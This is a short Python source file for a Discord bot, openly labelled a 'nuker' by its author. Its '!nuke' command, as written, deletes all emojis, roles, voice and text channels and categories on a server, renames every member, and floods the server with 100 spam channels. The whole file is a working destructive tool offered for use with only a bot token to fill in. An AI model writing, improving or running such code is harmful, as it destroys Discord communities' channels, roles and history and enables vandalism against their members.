import discord
from discord.ext import commands
import json

nuker = "Marin" # <--- Put your username here
jeton = "" # <--- Put your bot token here


bot = commands.Bot(command_prefix="!", help_command=None)

@bot.event
async def on_ready():
   print("  Bot start successfully !")
   await bot.change_presence(status=discord.Status.online, activity=discord.Game("By Marin#9044"))


@bot.command()
async def nuke(ctx):
   global nuker
   await ctx.message.guild.edit(name=f"NUCK BY {nuker}")
   await ctx.message.delete()

   for emoji in ctx.message.guild.emojis:
      try: await emoji.delete()
      except: pass
   for role in ctx.message.guild.roles:
      try: await role.delete()
      except: pass
   for member in ctx.message.guild.members: await member.edit(nick=f"NUCK BY {nuker}")
   for channel in ctx.message.guild.voice_channels: await channel.delete()
   for channel in ctx.message.guild.text_channels: await channel.delete()
   for category in ctx.message.guild.categories: await category.delete()
   for i in range(100):
      await ctx.message.guild.create_text_channel(f"nuked by {nuker}")



print("\n  Nuker by Marin#9044\n\n  Bot is starting . . .")
bot.run(jeton)